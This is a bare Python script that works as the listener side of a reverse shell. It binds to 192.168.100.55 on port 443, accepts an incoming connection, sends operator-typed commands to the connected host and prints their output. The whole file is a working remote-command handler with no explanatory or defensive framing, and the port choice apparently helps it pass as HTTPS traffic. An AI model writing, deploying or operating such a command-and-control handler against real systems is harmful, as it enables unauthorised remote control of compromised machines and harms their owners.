#!/usr/bin/env python3

import socket

def create_socket():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    return s

def main():
    s = create_socket()
    s.bind(('192.168.100.55', 443))
    s.listen()

    client_socket, client_addr = s.accept()

    print(f"\n[+] Connection established by {client_addr}\n")

    while True:
        command = input('>> ')
        client_socket.send(command.encode())
        output = client_socket.recv(1024).decode()
        print(f"\n{output}\n")

if __name__ == "__main__":
    main()
